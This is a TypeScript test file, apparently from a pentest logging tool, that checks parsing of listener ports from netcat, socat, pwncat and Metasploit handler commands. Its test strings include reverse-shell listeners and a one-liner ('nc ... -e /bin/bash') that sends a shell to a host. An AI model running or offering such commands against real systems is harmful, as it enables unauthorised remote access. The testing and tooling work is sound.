import { describe, it, expect } from 'vitest';
import type { LogEntry } from '../../../types/log';
import { listenerPortsInCommand, loggedListenerPorts, nextFreePort } from '../../../engines/checklist/listeners';

describe('listenerPortsInCommand', () => {
  it('reads the port from the common netcat forms', () => {
    for (const c of ['nc -lvnp 4444', 'nc -nvlp 4444', 'nc -lnvp 4444', 'nc -l -p 4444', 'ncat -lvnp 4444', 'rlwrap -cAr nc -lvnp 4444', 'nc.traditional -lvp 4444']) {
      expect(listenerPortsInCommand(c)).toEqual([4444]);
    }
  });

  it('reads pwncat and socat listeners', () => {
    expect(listenerPortsInCommand('pwncat-cs -lp 4444')).toEqual([4444]);
    expect(listenerPortsInCommand('pwncat -l 9001')).toEqual([9001]);
    expect(listenerPortsInCommand('socat TCP-LISTEN:4444,reuseaddr,fork -')).toEqual([4444]);
    expect(listenerPortsInCommand('socat TCP4-LISTEN:8080 STDOUT')).toEqual([8080]);
  });

  it('reads a Metasploit multi/handler LPORT, even across lines', () => {
    expect(listenerPortsInCommand('use exploit/multi/handler\nset payload windows/x64/shell_reverse_tcp\nset LPORT 4444\nrun')).toEqual([4444]);
    expect(listenerPortsInCommand('msfconsole -q -x "use exploit/multi/handler; set LPORT 5555; run"')).toEqual([5555]);
  });

  it('ignores commands that are not shell listeners', () => {
    expect(listenerPortsInCommand('python3 -m http.server 8000')).toEqual([]);
    expect(listenerPortsInCommand('nc 10.0.0.5 4444 -e /bin/bash')).toEqual([]);
    expect(listenerPortsInCommand('nmap -p 4444 10.0.0.5')).toEqual([]);
    expect(listenerPortsInCommand('curl http://10.0.0.5:8080/')).toEqual([]);
  });

  it('drops out-of-range ports', () => {
    expect(listenerPortsInCommand('nc -lvnp 70000')).toEqual([]);
  });
});

const cmd = (command: string, over: Partial<LogEntry> = {}): LogEntry =>
  ({ id: 'e', kind: 'command', content: { kind: 'command', blocks: [{ command, output: '' }] }, ...over }) as unknown as LogEntry;

describe('loggedListenerPorts', () => {
  it('collects listener ports across the log and ignores non-commands', () => {
    const log = [
      cmd('nc -lvnp 4444'),
      cmd('socat TCP-LISTEN:9001,fork -'),
      cmd('whoami'),
      ({ id: 's', kind: 'screenshot', content: { kind: 'screenshot', attachmentId: '', caption: 'nc -lvnp 5555', fileName: 'x.png' } } as unknown as LogEntry),
    ];
    expect([...loggedListenerPorts(log)].sort((a, b) => a - b)).toEqual([4444, 9001]);
  });
});

describe('nextFreePort', () => {
  it('returns the port when it is free', () => {
    expect(nextFreePort(4444, new Set())).toBe(4444);
  });
  it('steps up past taken ports', () => {
    expect(nextFreePort(4444, new Set([4444]))).toBe(4445);
    expect(nextFreePort(4444, new Set([4444, 4445, 4446]))).toBe(4447);
  });
});
